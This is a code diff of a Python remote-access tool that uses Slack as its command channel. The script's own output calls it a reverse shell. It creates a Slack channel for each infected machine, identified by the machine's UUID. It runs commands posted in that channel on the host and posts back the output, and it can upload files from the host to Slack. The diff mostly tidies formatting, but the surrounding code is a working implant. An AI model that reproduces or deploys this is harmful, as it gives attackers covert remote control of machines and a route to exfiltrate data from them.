@@ -1,23 +1,20 @@
-from ast import literal_eval
-import json
 import os
 import platform
-import re
 import slack
 import subprocess
 import sys
 import time
 import yaml
 
-def run_c(input_c, sh_channel_id):
 
+def run_c(input_c, sh_channel_id):
     if input_c[:7] == "upload ":
         try:
             out = client.files_upload(file=input_c[7:],
-                                    channels=sh_channel_id,
-                                    filename=input_c[7:],
-                                    title=input_c[7:],
-                                    )
+                                      channels=sh_channel_id,
+                                      filename=input_c[7:],
+                                      title=input_c[7:],
+                                      )
 
             assert out["ok"]
 
@@ -30,7 +27,7 @@ def run_c(input_c, sh_channel_id):
 
     elif input_c[:3] == "cd ":
         out = os.chdir(input_c[3:])
-        return "cd complete."
+        return "`cd` complete."
 
     else:
         try:
@@ -41,7 +38,7 @@ def run_c(input_c, sh_channel_id):
         if out == "":
             return "The command did not return anything."
         else:
-            return out
+            return f"```{out}```"
 
 
 # TODO:
@@ -83,7 +80,7 @@ def init_conn():
                                                     "awk",
                                                     "-F",
                                                     "'/IOPlatformUUID/{print $(NF-1)}'"
-                                                   ])
+                                                    ])
                            )
     else:
         machine_UUID = str("unknown")
@@ -115,9 +112,9 @@ new_channel_name = str(channel_prefix + str(sh_num))
 
 # If UUID != any of the channels:
 create_response = client.conversations_create(name=new_channel_name, # List channels, give number to channels.
-                                              is_private = False, # Operator would need to be invited to the channel even if the op is the channel admin. 
-                                              user_ids = op_user_ids # Set to true for a private channel.
-                                             )
+                                              is_private=False, # Operator would need to be invited to the channel even if the op is the channel admin.
+                                              user_ids=op_user_ids # Set to true for a private channel.
+                                              )
 
 sh_channel = create_response.__getitem__("channel")
 sh_channel_id = sh_channel["id"]
@@ -127,25 +124,22 @@ print(f"{sh_channel_name} ID: {sh_channel_id}")
 print(f"Please search for {sh_channel_name} in your Slack workspace to use the reverse shell")
 
 # conversations.join - Use the user API to join the channel later
-client.conversations_join(channel = sh_channel_id)
+client.conversations_join(channel=sh_channel_id)
 
 # Slack doesnt let us remove channels for now.
 time.sleep(1)
-
 
 response = client.chat_postMessage(channel=sh_channel_id, text=sh_stdout)
 assert response["ok"]
 # assert response["message"]["text"] == sh_stdout
 time.sleep(1)
 
-
 sh_comm = ""
 old_messages = ""
 messages = "randomval"
 
 while True:
-
-    sh_history = client.conversations_history(channel = sh_channel_id)
+    sh_history = client.conversations_history(channel=sh_channel_id)
     time.sleep(0.3)
     messages = sh_history.__getitem__("messages")[0]
 
